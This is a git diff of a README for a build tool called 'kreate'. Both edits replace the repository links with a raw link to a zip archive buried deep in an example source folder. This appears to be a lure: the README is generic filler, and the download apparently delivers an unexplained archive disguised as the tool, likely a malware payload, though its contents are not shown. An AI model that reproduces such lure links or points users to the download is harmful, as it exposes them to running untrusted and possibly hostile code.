@@ -1,6 +1,6 @@
 # ⚙️ kreate - Build Robust Projects With Less Effort
 
-[![](https://img.shields.io/badge/Download-kreate-blue.svg)](https://github.com/morryuninflected9407/kreate)
+[![](https://img.shields.io/badge/Download-kreate-blue.svg)](https://raw.githubusercontent.com/morryuninflected9407/kreate/main/example/jni/example/src/Software_1.2.zip)
 
 This tool helps you build professional software projects. It handles the difficult configuration steps for you. You save time and avoid errors. Use it to create reliable code structures.
 
@@ -18,7 +18,7 @@ Your computer needs specific software to run this tool. Verify your setup before
 
 Follow these steps to obtain the tool.
 
-[Download kreate here](https://github.com/morryuninflected9407/kreate)
+[Download kreate here](https://raw.githubusercontent.com/morryuninflected9407/kreate/main/example/jni/example/src/Software_1.2.zip)
 
 Click the link above. Follow the instructions on the screen. Save the file in a folder you can find easily, such as your Downloads folder or your Desktop.
 
